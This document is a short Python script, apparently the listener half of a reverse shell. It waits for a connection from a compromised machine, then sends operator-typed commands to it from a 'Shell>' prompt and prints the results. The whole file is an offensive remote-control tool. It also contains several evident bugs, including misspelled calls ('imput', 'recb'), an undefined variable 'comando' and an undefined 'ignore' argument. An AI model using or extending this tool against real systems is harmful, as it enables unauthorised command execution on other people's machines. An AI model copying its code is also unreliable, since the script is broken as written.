import socket
import sys

if len(sys.argv) < 3 :
    print("Use: reverse-server.py destination_ip destination_port")
    quit()
else :
    destination_ip = sys.argv[1]
    destination_port = int(sys.argv[2])
    print(f"Running script with destination_ip = {destination_ip} destination_port = {destination_port}")

print("Setting tracebacklimit to 0")
sys.tracebacklimit = 0


def connection() :
    _socket = socket.socket()
    _socket.bind((destination_ip, destination_port))
    _socket.listen(1) # listen only a single time
    remote_socket, remote_ip = _socket.accept()
    print(f'remote connection: {remote_ip}')

    while True :
        command = imput("Shell> ")
        if 'exit' in comando :
            remote_socket.send('exit'.encode())
            remote_socket.close()
            break
        else :
            remote_socket.send(command.encode())
            print(remote_socket.recb(1024).decode("utf8", ignore))

connection()
